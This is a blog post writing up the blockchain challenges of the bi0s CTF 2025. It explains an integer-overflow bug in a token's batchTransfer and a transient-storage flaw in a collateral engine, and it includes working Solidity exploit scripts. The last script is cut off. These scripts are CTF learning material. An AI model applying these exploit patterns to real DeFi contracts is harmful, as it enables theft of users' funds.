@@ -1,0 +1,825 @@
+<!DOCTYPE html><html lang="kr" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(CTF) bi0s CTF 2025 writeup (blockchains)" /><meta property="og:locale" content="kr" /><meta name="description" content="bi0s CTF 2025 writeup" /><meta property="og:description" content="bi0s CTF 2025 writeup" /><link rel="canonical" href="http://blog.solidity.kr/posts/(ctf)-bi0s-ctf-2025/" /><meta property="og:url" content="http://blog.solidity.kr/posts/(ctf)-bi0s-ctf-2025/" /><meta property="og:site_name" content="snwo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-06-15T01:02:13+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(CTF) bi0s CTF 2025 writeup (blockchains)" /><meta name="twitter:site" content="@snwo_kr" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"bi0s CTF 2025 writeup","url":"http://blog.solidity.kr/posts/(ctf)-bi0s-ctf-2025/","@type":"BlogPosting","headline":"(CTF) bi0s CTF 2025 writeup (blockchains)","dateModified":"2025-06-15T01:22:45+09:00","datePublished":"2025-06-15T01:02:13+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.solidity.kr/posts/(ctf)-bi0s-ctf-2025/"},"@context":"https://schema.org"}</script><title>(CTF) bi0s CTF 2025 writeup (blockchains) | snwo</title><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://media.discordapp.net/attachments/952583628351746111/1366448241180409956/ralph.png?ex=68f9ac58&is=68f85ad8&hm=fa5cd570119d286902631feb85f361030c6a4f7c3eb252f258530ed92ba7ba4b&=&format=webp&quality=lossless&width=2488&height=2168" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">snwo</a></div><div class="site-subtitle font-italic">Interested in REV,WEB3,PWN</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/snwox" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/snwo_kr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(CTF) bi0s CTF 2025 writeup (blockchains)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(CTF) bi0s CTF 2025 writeup (blockchains)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/snwo_kr">snwo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2025-06-15 01:02:13 +0900" data-toggle="tooltip" data-placement="bottom" title="Sun, Jun 15, 2025, 1:02 AM +0900" >Jun 15</em> </span> <span> Updated <em class="timeago" date="2025-06-15 01:22:45 +0900 " data-toggle="tooltip" data-placement="bottom" title="Sun, Jun 15, 2025, 1:22 AM +0900" >Jun 15</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2304 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><blockquote><p>This post can be also found in <a href="https://sekai.team/blog/bi0sCTF-2025/blockchains">Project Sekai</a> blog :D</p></blockquote><p>I participated in bi0s CTF this week as part of Project Sekai, solved all blockchain challenges with my teammate @yanhui. Overall, the quality of DeFi-related challenges was good, though there were some unintended solutions and minor bugs within the codebase.</p><h2 id="empty-vessel">Empty Vessel<a href="#empty-vessel" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>The setup</p><blockquote><p>The user starts with <code class="language-plaintext highlighter-rouge">1746230400</code> INR. <code class="language-plaintext highlighter-rouge">stakeINR</code> should be called before setup contract redeem all shares.</p></blockquote><p>The goal</p><blockquote><p>The received assets should be less than or equal to <code class="language-plaintext highlighter-rouge">75_000e18</code>.</p></blockquote><h3 id="analyze-a-bit">Analyze a bit<a href="#analyze-a-bit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">deposit</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">assets</span><span class="p">,</span> <span class="kt">address</span> <span class="n">receiver</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">assets</span><span class="o">&gt;</span><span class="n">maxDeposit</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">)){</span>
+            <span class="nb">revert</span> <span class="n">Stake_Assets_Exceeds_Max_Deposit_Limit</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="kt">uint256</span> <span class="n">shares</span><span class="o">=</span><span class="n">convertToShares</span><span class="p">(</span><span class="n">assets</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">shares</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">Stake_Zero_Shares</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="c1">// [...]
+</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">Stake</code> contract is a simple ERC4626 vault with a zero-share check. We can make the <code class="language-plaintext highlighter-rouge">setup</code> contract redeem just <code class="language-plaintext highlighter-rouge">75_000e18</code> INR with the first 1 wei deposit and by sending <code class="language-plaintext highlighter-rouge">50_000e18</code> INR to the Stake contract. However, it only gives <code class="language-plaintext highlighter-rouge">1746230400</code> INR.</p><h3 id="the-bug">The bug<a href="#the-bug" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">batchTransfer</span><span class="p">(</span><span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">receivers</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span><span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+	<span class="c1">// [...]
+</span>            <span class="k">if</span> <span class="n">lt</span><span class="p">(</span><span class="n">mload</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span><span class="n">mul</span><span class="p">(</span><span class="n">mload</span><span class="p">(</span><span class="n">receivers</span><span class="p">),</span><span class="n">amount</span><span class="p">)){</span> <span class="c1">// amount &lt; receivers * amount
+</span>                <span class="n">mstore</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="mh">0x20</span><span class="p">),</span><span class="mh">0xcf479181</span><span class="p">)</span>
+                <span class="n">mstore</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="mh">0x40</span><span class="p">),</span><span class="n">mload</span><span class="p">(</span><span class="n">ptr</span><span class="p">))</span>
+                <span class="n">mstore</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="mh">0x60</span><span class="p">),</span><span class="n">mul</span><span class="p">(</span><span class="n">mload</span><span class="p">(</span><span class="n">receivers</span><span class="p">),</span><span class="n">amount</span><span class="p">))</span>
+                <span class="nb">revert</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="mh">0x20</span><span class="p">),</span><span class="mh">0x1c</span><span class="p">),</span><span class="mh">0x44</span><span class="p">)</span>
+            <span class="p">}</span>
+            
+            <span class="k">for</span> <span class="p">{</span><span class="kr">let</span> <span class="n">i</span><span class="o">:=</span><span class="mh">0x00</span><span class="p">}</span> <span class="n">lt</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mload</span><span class="p">(</span><span class="n">receivers</span><span class="p">))</span> <span class="p">{</span><span class="n">i</span><span class="o">:=</span><span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x01</span><span class="p">)}{</span>
+                <span class="n">mstore</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">mload</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">receivers</span><span class="p">,</span><span class="n">mul</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0x01</span><span class="p">),</span><span class="mh">0x20</span><span class="p">))))</span>
+                <span class="n">mstore</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="mh">0x20</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+                <span class="n">sstore</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="mh">0x40</span><span class="p">),</span><span class="n">add</span><span class="p">(</span><span class="n">sload</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="mh">0x40</span><span class="p">)),</span><span class="n">amount</span><span class="p">))</span>
+            <span class="p">}</span>
+</pre></table></code></div></div><p>The bug was in the <code class="language-plaintext highlighter-rouge">INR</code> token contract. There is an integer overflow in the amount check, so by sending <code class="language-plaintext highlighter-rouge">(1&lt;&lt;256)/2</code> to the user and another address, we can inflate the INR balance.</p><h3 id="exploit">Exploit<a href="#exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><ol><li>Claim INR.<li>Call <code class="language-plaintext highlighter-rouge">batchTransfer</code> to send <code class="language-plaintext highlighter-rouge">(1&lt;&lt;256)/2</code> to the user.<li>Deposit 1 wei and send <code class="language-plaintext highlighter-rouge">50_000e18</code> INR to the Stake contract.</ol><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="k">contract</span> <span class="n">Solve</span> <span class="k">is</span> <span class="n">Script</span><span class="p">{</span>
+    <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
+        <span class="n">Setup</span> <span class="n">setup</span><span class="o">=</span><span class="n">Setup</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"SETUP"</span><span class="p">));</span>
+        <span class="n">Stake</span> <span class="n">stake</span><span class="o">=</span><span class="n">setup</span><span class="p">.</span><span class="n">stake</span><span class="p">();</span>
+        <span class="n">INR</span> <span class="n">inr</span><span class="o">=</span><span class="n">setup</span><span class="p">.</span><span class="n">inr</span><span class="p">();</span>
+        <span class="n">setup</span><span class="p">.</span><span class="n">claim</span><span class="p">();</span>
+        <span class="n">inr</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">stake</span><span class="p">),</span> <span class="k">type</span><span class="p">(</span><span class="kt">uint256</span><span class="p">).</span><span class="n">max</span><span class="p">);</span>
+        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">receivers</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+        <span class="n">receivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
+        <span class="n">receivers</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">inr</span><span class="p">.</span><span class="n">batchTransfer</span><span class="p">(</span><span class="n">receivers</span><span class="p">,</span> <span class="mh">0x8000000000000000000000000000000000000000000000000000000000000000</span><span class="p">);</span>
+        <span class="n">stake</span><span class="p">.</span><span class="n">deposit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+        <span class="n">inr</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">stake</span><span class="p">),</span> <span class="mi">50</span><span class="n">_000</span> <span class="kc">ether</span><span class="p">);</span>
+        <span class="n">setup</span><span class="p">.</span><span class="n">stakeINR</span><span class="p">();</span>
+        <span class="n">setup</span><span class="p">.</span><span class="n">solve</span><span class="p">();</span>
+        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><h2 id="transient-heist">Transient Heist<a href="#transient-heist" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>The setup</p><blockquote><p>Create WETH/USDC, WETH/SafeMoon, and SafeMoon/USDC pools. The user starts with <code class="language-plaintext highlighter-rouge">80_001e18</code> WETH.</p></blockquote><p>The goal</p><blockquote><p>make collateral deposited over hash amount</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span><span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+        <span class="kt">bytes32</span> <span class="n">FLAG_HASH</span><span class="o">=</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">"YOU NEED SOME BUCKS TO GET FLAG"</span><span class="p">);</span>
+        <span class="kt">bool</span> <span class="n">check1</span><span class="p">;</span>
+        <span class="kt">bool</span> <span class="n">check2</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">usdsEngine</span><span class="p">.</span><span class="n">collateralDeposited</span><span class="p">(</span><span class="n">player</span><span class="p">,</span><span class="n">usdsEngine</span><span class="p">.</span><span class="n">collateralTokens</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span><span class="o">&gt;</span><span class="kt">uint256</span><span class="p">(</span><span class="n">FLAG_HASH</span><span class="p">)){</span>
+            <span class="n">check1</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">usdsEngine</span><span class="p">.</span><span class="n">collateralDeposited</span><span class="p">(</span><span class="n">player</span><span class="p">,</span><span class="n">usdsEngine</span><span class="p">.</span><span class="n">collateralTokens</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="kt">uint256</span><span class="p">(</span><span class="n">FLAG_HASH</span><span class="p">)){</span>
+            <span class="n">check2</span><span class="o">=</span><span class="nb">true</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">check1</span><span class="o">&amp;&amp;</span><span class="n">check2</span><span class="p">);</span>
+    <span class="p">}</span>
+</pre></table></code></div></div></blockquote><h3 id="analyze-a-bit-1">Analyze a bit<a href="#analyze-a-bit-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><hr /><p>The <code class="language-plaintext highlighter-rouge">USDSEngine</code> contract provides functionality to mint and burn the <code class="language-plaintext highlighter-rouge">USDS</code> token based on the collateral deposited. Let’s look at the <code class="language-plaintext highlighter-rouge">depositCollateralThroughSwap</code> and <code class="language-plaintext highlighter-rouge">bi0sSwapv1Call</code> functions. The contract stores the address of the <code class="language-plaintext highlighter-rouge">bi0sSwapPair</code> in transient storage slot 1. After the swap, it updates this slot with the amount of tokens sent back. The <code class="language-plaintext highlighter-rouge">bi0sSwapv1Call</code> function is called by the <code class="language-plaintext highlighter-rouge">bi0sSwapPair</code> contract after a swap. It checks if the sender matches the address stored in slot 1 and then increases the collateral deposited by the <code class="language-plaintext highlighter-rouge">collateralDepositAmount</code>.</p><p>If we can set <code class="language-plaintext highlighter-rouge">tokensSentBack</code> to the user’s address, we can increase the collateral amount arbitrarily. The <code class="language-plaintext highlighter-rouge">acceptedToken</code> modifier only checks <code class="language-plaintext highlighter-rouge">_otherToken</code>, not <code class="language-plaintext highlighter-rouge">_collateralToken</code>. This allows us to create a fake token pair that can manipulate <code class="language-plaintext highlighter-rouge">amountOut</code> to the user’s address and set any desired collateral deposit amount.</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre>    <span class="k">function</span> <span class="n">depositCollateralThroughSwap</span><span class="p">(</span><span class="kt">address</span> <span class="n">_otherToken</span><span class="p">,</span><span class="kt">address</span> <span class="n">_collateralToken</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">swapAmount</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">_collateralDepositAmount</span><span class="p">)</span> <span class="k">public</span> <span class="n">acceptedToken</span><span class="p">(</span><span class="n">_otherToken</span><span class="p">)</span><span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">tokensSentBack</span><span class="p">){</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">_otherToken</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">swapAmount</span><span class="p">);</span>
+        <span class="n">IBi0sSwapPair</span> <span class="n">bi0sSwapPair</span><span class="o">=</span><span class="n">IBi0sSwapPair</span><span class="p">(</span><span class="n">bi0sSwapFactory</span><span class="p">.</span><span class="n">getPair</span><span class="p">(</span><span class="n">_otherToken</span><span class="p">,</span> <span class="n">_collateralToken</span><span class="p">));</span>
+        <span class="k">assembly</span><span class="p">{</span>
+            <span class="n">tstore</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">bi0sSwapPair</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="o">=</span><span class="n">abi</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="n">_collateralDepositAmount</span><span class="p">);</span>
+        <span class="n">bi0sSwapPair</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="n">_otherToken</span><span class="p">,</span> <span class="n">swapAmount</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span><span class="n">data</span><span class="p">);</span>
+        <span class="k">assembly</span><span class="p">{</span>
+            <span class="n">tokensSentBack</span><span class="o">:=</span><span class="n">tload</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">bi0sSwapv1Call</span><span class="p">(</span><span class="kt">address</span> <span class="n">sender</span><span class="p">,</span><span class="kt">address</span> <span class="n">collateralToken</span><span class="p">,</span><span class="kt">uint256</span> <span class="n">amountOut</span><span class="p">,</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="k">external</span> <span class="n">nonReEntrant</span> <span class="p">{</span>
+        <span class="kt">uint256</span> <span class="n">collateralDepositAmount</span><span class="o">=</span><span class="n">abi</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data</span><span class="p">,(</span><span class="kt">uint256</span><span class="p">));</span>
+        <span class="kt">address</span> <span class="n">bi0sSwapPair</span><span class="p">;</span>
+        <span class="k">assembly</span><span class="p">{</span>
+            <span class="n">bi0sSwapPair</span><span class="o">:=</span><span class="n">tload</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="o">!=</span><span class="n">bi0sSwapPair</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">USDSEngine__Only__bi0sSwapPair__Can__Call</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">collateralDepositAmount</span><span class="o">&lt;</span><span class="n">amountOut</span><span class="p">){</span>
+            <span class="nb">revert</span> <span class="n">USDSEngine__Insufficient__Collateral</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="kt">uint256</span> <span class="n">tokensSentBack</span><span class="o">=</span><span class="n">amountOut</span><span class="o">-</span><span class="n">collateralDepositAmount</span><span class="p">;</span>
+        <span class="k">assembly</span><span class="p">{</span>
+            <span class="n">tstore</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">tokensSentBack</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="n">collateralDeposited</span><span class="p">[</span><span class="n">sender</span><span class="p">][</span><span class="n">collateralToken</span><span class="p">]</span><span class="o">+=</span><span class="n">collateralDepositAmount</span><span class="p">;</span>
+    <span class="p">}</span>
+</pre></table></code></div></div><h3 id="exploit-1">Exploit<a href="#exploit-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+</pre><td class="rouge-code"><pre><span class="k">contract</span> <span class="n">Exploiter</span> <span class="p">{</span>
+    <span class="n">Setup</span> <span class="n">setup</span><span class="p">;</span>
+    <span class="n">IBi0sSwapFactory</span> <span class="n">factory</span><span class="p">;</span>
+
+    <span class="n">WETH</span> <span class="n">weth</span><span class="p">;</span>
+    <span class="n">USDC</span> <span class="n">usdc</span><span class="p">;</span>
+    <span class="n">SafeMoon</span> <span class="n">safeMoon</span><span class="p">;</span>
+
+    <span class="kt">address</span> <span class="n">wethSafeMoonPair</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="n">wethUsdcPair</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="n">safeMoonUsdcPair</span><span class="p">;</span>
+
+    <span class="n">USDSEngine</span> <span class="n">usdsEngine</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="n">Setup</span> <span class="n">_setup</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="n">setup</span> <span class="o">=</span> <span class="n">_setup</span><span class="p">;</span>
+        <span class="n">factory</span> <span class="o">=</span> <span class="n">_setup</span><span class="p">.</span><span class="n">bi0sSwapFactory</span><span class="p">();</span>
+        <span class="n">weth</span> <span class="o">=</span> <span class="n">_setup</span><span class="p">.</span><span class="n">weth</span><span class="p">();</span>
+        <span class="n">usdc</span> <span class="o">=</span> <span class="n">_setup</span><span class="p">.</span><span class="n">usdc</span><span class="p">();</span>
+        <span class="n">safeMoon</span> <span class="o">=</span> <span class="n">_setup</span><span class="p">.</span><span class="n">safeMoon</span><span class="p">();</span>
+        <span class="n">wethSafeMoonPair</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">_setup</span><span class="p">.</span><span class="n">wethSafeMoonPair</span><span class="p">());</span>
+        <span class="n">wethUsdcPair</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">_setup</span><span class="p">.</span><span class="n">wethUsdcPair</span><span class="p">());</span>
+        <span class="n">safeMoonUsdcPair</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">_setup</span><span class="p">.</span><span class="n">safeMoonUsdcPair</span><span class="p">());</span>
+        <span class="n">usdsEngine</span> <span class="o">=</span> <span class="n">_setup</span><span class="p">.</span><span class="n">usdsEngine</span><span class="p">();</span>
+
+        <span class="n">_setup</span><span class="p">.</span><span class="n">setPlayer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">exploit</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="n">USDC</span> <span class="n">fake</span> <span class="o">=</span> <span class="k">new</span> <span class="n">USDC</span><span class="p">(</span><span class="k">type</span><span class="p">(</span><span class="kt">uint</span><span class="p">).</span><span class="n">max</span><span class="p">);</span>
+        <span class="kt">address</span> <span class="n">fakePair</span> <span class="o">=</span> <span class="n">factory</span><span class="p">.</span><span class="n">createPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">fake</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">));</span>
+        <span class="kt">uint</span> <span class="n">addressAmount</span> <span class="o">=</span> <span class="kt">uint160</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
